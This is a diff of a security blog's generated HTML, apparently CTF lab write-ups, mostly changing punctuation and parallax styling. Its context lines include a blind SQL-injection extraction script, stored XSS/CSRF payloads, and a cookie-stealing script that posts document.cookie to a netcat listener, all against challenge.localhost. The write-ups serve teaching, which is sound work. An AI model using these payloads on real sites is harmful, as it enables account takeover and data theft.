@@ -568,11 +568,11 @@ UNION</h2>
 <h2 id="sqli-5---blind-sqli">sqli 5 - blind SQLi</h2>
 <p>vulnerable query uses f-string interpolation:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query = <span class="string">f&quot;SELECT rowid, * FROM users WHERE username = &#x27;<span class="subst">&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="subst">&#123; password &#125;</span>&#x27;&quot;</span></span><br><span class="line">user = db.execute(query).fetchone()</span><br></pre></td></tr></table></figure>
-<p>admin’s password is the flag. no direct output – need blind
+<p>admin's password is the flag. no direct output -- need blind
 extraction.</p>
 <p>naive attempt fails because AND has higher precedence than OR:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># password=&#x27; or substr(password,1,1)=&#x27;p&#x27; --</span></span><br><span class="line"><span class="comment"># parses as: (username=&#x27;admin&#x27; AND password=&#x27;&#x27;) OR (substr(...)=&#x27;p&#x27;)</span></span><br><span class="line"><span class="comment"># this matches ANY user when substr is true, not just admin</span></span><br></pre></td></tr></table></figure>
-<p>blind extraction script – check one char at a time,
+<p>blind extraction script -- check one char at a time,
 <code>OR username='admin' AND substr(...)</code> ensures we only match
 admin:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br><span class="line">charset = string.printable.strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_sql</span>():</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">            payload = <span class="string">f&quot;&#x27; OR username=&#x27;admin&#x27; AND substr(password,<span class="subst">&#123;pos&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27; --&quot;</span></span><br><span class="line">            resp = requests.post(url, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>: payload&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span> resp.status_code != <span class="number">403</span> <span class="keyword">and</span> resp.status_code != <span class="number">500</span>:</span><br><span class="line">                result += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot; [+] Current extracted: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot; [+] Extracted: <span class="subst">&#123;blind_sql()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
@@ -686,11 +686,11 @@ first:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/victim <span class="string">&quot;http://challenge.localhost:80/?msg=&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;&quot;</span></span><br></pre></td></tr></table></figure>
 <h2 id="xss-5---stored-xss-csrf-get-publish">xss 5 - stored XSS + CSRF
 (GET publish)</h2>
-<p>admin’s unpublished draft contains the flag. published posts render
+<p>admin's unpublished draft contains the flag. published posts render
 raw HTML. <code>/publish</code> is <strong>GET</strong>.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/publish&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_publish</span>():</span><br><span class="line">    db.execute(<span class="string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [flask.session.get(<span class="string">&quot;username&quot;</span>)])</span><br></pre></td></tr></table></figure>
-<p>login as hacker, store XSS that makes admin’s browser call
-<code>/publish</code>, which publishes admin’s flag draft:</p>
+<p>login as hacker, store XSS that makes admin's browser call
+<code>/publish</code>, which publishes admin's flag draft:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -c cookie.txt -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl -b cookie.txt -X POST http://challenge.localhost:80/draft \</span><br><span class="line">  -d <span class="string">&quot;content=&lt;script&gt;fetch(&#x27;/publish&#x27;)&lt;/script&gt;&amp;publish=on&quot;</span></span><br><span class="line">/challenge/victim</span><br><span class="line">curl -b cookie.txt <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure>
 <h2 id="xss-6---stored-xss-csrf-post-publish">xss 6 - stored XSS + CSRF
 (POST publish)</h2>
@@ -708,7 +708,7 @@ flask.session)</li>
 <li>drafts are visible to their own author</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">response.set_cookie(<span class="string">&quot;auth&quot;</span>, username + <span class="string">&quot;|&quot;</span> + password)</span><br><span class="line"></span><br><span class="line"><span class="comment"># admin blocked</span></span><br><span class="line"><span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">    flask.abort(<span class="number">400</span>, <span class="string">&quot;pwnpost no longer supports admin posting due to rampant flag disclosure&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># drafts visible to author</span></span><br><span class="line"><span class="keyword">elif</span> post[<span class="string">&quot;author&quot;</span>] == username:</span><br><span class="line">    page += <span class="string">&quot;&lt;b&gt;YOUR DRAFT POST:&lt;/b&gt; &quot;</span> + post[<span class="string">&quot;content&quot;</span>] + <span class="string">&quot;&lt;hr&gt;\n&quot;</span></span><br></pre></td></tr></table></figure>
-<p>since admin can’t publish, steal the cookie instead and log in as
+<p>since admin can't publish, steal the cookie instead and log in as
 admin to view the draft:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. login as hacker, store XSS that exfiltrates document.cookie</span></span><br><span class="line">curl -c cookie.txt -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl -b cookie.txt -X POST http://challenge.localhost:80/draft \</span><br><span class="line">  -d <span class="string">&quot;content=&lt;script&gt;fetch(&#x27;http://localhost:1337/&#x27;, &#123;method: &#x27;POST&#x27;, body: document.cookie&#125;)&lt;/script&gt;&amp;publish=on&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. listen for stolen cookie</span></span><br><span class="line">nc -l -p 1337 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. trigger victim (admin) to visit the page</span></span><br><span class="line">/challenge/victim</span><br><span class="line"><span class="comment"># received: auth=admin|RT.dJDO1YDL4cjM1gzW&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. use stolen cookie to view as admin</span></span><br><span class="line">curl --cookie <span class="string">&quot;auth=admin|RT.dJDO1YDL4cjM1gzW&#125;&quot;</span> <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure>
 
@@ -824,12 +824,12 @@ following the redirect to <code>challenge.localhost</code>.</p>
 <li>Host the payload: <code>python3 -m http.server 1337</code></li>
 <li>Trigger the victim to visit your server:
 <code>/challenge/victim</code></li>
-<li>The admin’s drafts are now published. Fetch the flag:
+<li>The admin's drafts are now published. Fetch the flag:
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure></li>
 </ol>
 <h2 id="csrf-level-2-post-based-csrf">CSRF Level 2: POST-based CSRF</h2>
 <p>The <code>/publish</code> route now requires a <code>POST</code>
-request. While this prevents simple link-based triggers, it doesn’t stop
+request. While this prevents simple link-based triggers, it doesn't stop
 CSRF if there are no CSRF tokens or origin checks.</p>
 <h3 id="exploit-1">Exploit</h3>
 <p>We use an HTML form that automatically submits itself via JavaScript
@@ -856,7 +856,7 @@ parameter.</p>
 <h2 id="csrf-level-4-cookie-stealing-via-xss">CSRF Level 4: Cookie
 Stealing via XSS</h2>
 <p>Building on the previous level, we use the XSS vulnerability to steal
-the admin’s session cookie.</p>
+the admin's session cookie.</p>
 <h3 id="exploit-3">Exploit</h3>
 <p>We inject a script that reads <code>document.cookie</code> and sends
 it to our attacker-controlled listener.</p>
@@ -871,7 +871,7 @@ it to access the flag: <figure class="highlight bash"><table><tr><td class="gutt
 </ol>
 <h2 id="csrf-level-5-data-exfiltration-via-xss">CSRF Level 5: Data
 Exfiltration via XSS</h2>
-<p>In this final level, we use XSS to fetch the content of the admin’s
+<p>In this final level, we use XSS to fetch the content of the admin's
 home page (where the flag is displayed) and send the entire HTML back to
 our listener.</p>
 <h3 id="exploit-4">Exploit</h3>
@@ -1254,7 +1254,7 @@ validates each character through error-code accumulation, then returns
 <code>-247</code> on any mismatch.</p>
 <p>The core pattern repeats 40 times:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sub_401560();                    <span class="comment">// intentionally failing WinAPI call</span></span><br><span class="line">LastError = GetLastError();      <span class="comment">// harvest the error code</span></span><br><span class="line">sub_40159B();</span><br><span class="line">v5 = GetLastError() + LastError; <span class="comment">// accumulate</span></span><br><span class="line">sub_4015D6();</span><br><span class="line">v6 = GetLastError() + v5;</span><br><span class="line"><span class="comment">// ... N calls total ...</span></span><br><span class="line"><span class="keyword">if</span> ( Buffer[i] != (<span class="type">int</span>)(accumulated) % <span class="number">126</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-247</span>;                 <span class="comment">// failure — 247CTF signature</span></span><br></pre></td></tr></table></figure>
-<p>The password is never stored anywhere. It’s implicitly encoded by the
+<p>The password is never stored anywhere. It's implicitly encoded by the
 <em>count</em> and <em>sequence</em> of WinAPI calls whose error codes
 reconstruct each character.</p>
 <h2 id="the-error-code-cycle">The Error Code Cycle</h2>
@@ -2042,7 +2042,7 @@ three key functions: <code>print_flag</code>, <code>no_flag</code>, and
 <p>The logic suggests we need to reach <code>print_flag</code> while
 avoiding the paths that lead to <code>no_flag</code>.</p>
 <h2 id="solution">Solution</h2>
-<p>Since the binary’s path to the flag is complex, we use
+<p>Since the binary's path to the flag is complex, we use
 <code>angr</code> to perform symbolic execution and find the correct
 input.</p>
 <h3 id="solver-script">Solver Script</h3>
@@ -2165,7 +2165,7 @@ boot sector.</p>
 <p>When a computer powers on and completes the Power-On Self-Test
 (POST), the BIOS reads the first sector (512 bytes) of the disk into
 physical memory between <strong><code>0x7C00</code> and
-<code>0x7DFF</code></strong>. It then sets the CPU’s Instruction Pointer
+<code>0x7DFF</code></strong>. It then sets the CPU's Instruction Pointer
 (IP) to <code>0x7C00</code> to begin execution.</p>
 <p>Therefore, the <strong>base address</strong> of this program in
 memory is <strong><code>0x7C00</code></strong>. When performing static
@@ -2321,8 +2321,8 @@ bases.</p>
 <li><code>R = c*k + 1</code></li>
 </ul>
 <p>Choose <code>a, b, c</code> as distinct primes with
-<code>a, b, c ≡ 1 (mod 8)</code> (for base-2 behavior),
-e.g. <code>89, 113, 137</code>.</p>
+<code>a, b, c ≡ 1 (mod 8)</code> (for base-2 behavior), e.g.
+<code>89, 113, 137</code>.</p>
 <p>To make <code>(P-1), (Q-1), (R-1)</code> divide <code>(N-1)</code>,
 solve the congruence system:</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">k ≡ -(b+c)(bc)^(-1) (mod a)</span><br><span class="line">k ≡ -(a+c)(ac)^(-1) (mod b)</span><br><span class="line">k ≡ -(a+b)(ab)^(-1) (mod c)</span><br></pre></td></tr></table></figure>
@@ -2441,8 +2441,8 @@ prime (with a strong primality test like
     let observer = null;
     let rafId = null;
 
-    const parallaxFactor = 0.1; // 提升移动幅度
-    const lerpFactor = 0.3; // 提升响应灵敏度
+    const parallaxFactor = 0.05; // 提升移动幅度
+    const lerpFactor = 0.05; // 提升响应灵敏度
     let currentY = 0; // 渲染位置
     let targetY = 0; // 目标位置
     let isUpdating = false; // 正在执行内容更新锁
@@ -2557,7 +2557,7 @@ prime (with a strong primality test like
     transform: translateX(-50%);
     font-size: 10vw;
     font-weight: 900;
-    color: rgba(255, 255, 255, 0.035);
+    color: rgba(255, 255, 255, 0.05);
     text-transform: uppercase;
     white-space: nowrap;
     pointer-events: none;
@@ -2565,7 +2565,7 @@ prime (with a strong primality test like
     user-select: none;
     font-family: "Roboto Mono", monospace;
     letter-spacing: -2px;
-    filter: blur(5px);
+    filter: blur(1.2px);
     opacity: 0; /* 初始隐藏，由 JS 控制淡入 */
     transition: opacity 1.2s cubic-bezier(0.4, 0, 0.2, 1);
     will-change: transform, opacity;
